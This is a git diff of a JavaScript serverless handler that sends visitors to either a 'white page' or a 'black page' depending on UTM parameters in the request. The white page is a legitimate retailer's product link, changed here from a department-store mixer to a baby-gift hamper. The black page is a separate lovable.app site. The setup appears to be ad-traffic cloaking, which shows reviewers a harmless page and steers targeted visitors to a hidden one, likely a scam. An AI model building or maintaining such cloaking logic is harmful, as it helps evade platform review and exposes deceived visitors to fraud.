@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.davidjones.com/product/kitchenaid-ksm180-blossom-tilt-head-stand-mixer-25330463?navId=930836&colorId=2445715";
+    const whitePageURL = "https://yellowduckbabygifts.com.au/products/new-baby-boy-organic-gift-hamper?pr_prod_strat=e5_desc&pr_rec_id=a3339a1c6&pr_rec_pid=7461295685820&pr_ref_pid=7461287788732&pr_seq=uniform";
     const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
